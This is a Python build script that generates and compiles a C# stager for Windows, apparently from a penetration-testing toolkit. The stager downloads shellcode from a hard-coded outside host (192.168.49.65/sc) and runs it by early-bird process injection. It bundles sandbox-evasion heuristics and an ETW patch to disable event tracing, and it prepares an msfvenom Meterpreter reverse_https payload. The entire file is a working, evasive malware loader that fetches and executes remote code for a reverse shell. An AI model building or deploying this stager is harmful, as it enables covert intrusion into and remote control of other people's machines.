#!/bin/env python3
import ak
import os
import subprocess

BASE_FILENAME = 'win_msf_sliver_stager_earlybird'
FN_CS = BASE_FILENAME + ".cs"
FN_SHELLCODE = BASE_FILENAME + '.sc'
MSFVENOM_CMD = f"msfvenom -p windows/x64/meterpreter/reverse_https LHOST={ak.LHOST} LPORT={ak.LPORT} -f raw -e generic/none"
STAGER_URL = "http://192.168.49.65/sc"

def get_shellcode(msfvenom_cmd):
  shellcode = subprocess.check_output(msfvenom_cmd, shell=True)

  return shellcode

def generate(stager_url):
  url_dl_code = ak.URL_DL_CODE.format(STAGER_URL=STAGER_URL)

  template = """
using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace SliverStager
{{
    public class Stager
    {{
        {ak.START_PROCESS_EARLYBIRD_IMPORT}
        {ak.HEURISTICS_IMPORT}
        {ak.ARCH_DETECTION}
        {ak.ETW_FUNCS}
        public static void Main()
        {{
            {ak.HEURISTICS_CODE}
            {ak.ETW_PATCH}
            {URL_DL_CODE}
            {ak.START_PROCESS_EARLYBIRD_CODE}
        }}

    }}
}}
  """.format(URL_DL_CODE=url_dl_code,
             ak=ak)

  ak.write_file(FN_CS, template)

def main():
  # shellcode = get_shellcode(MSFVENOM_CMD)
  # ak.write_file(FN_SHELLCODE, shellcode)

  generate(STAGER_URL)
  ak.cs_compile(FN_CS, flags="")

if __name__ == "__main__":
  main()
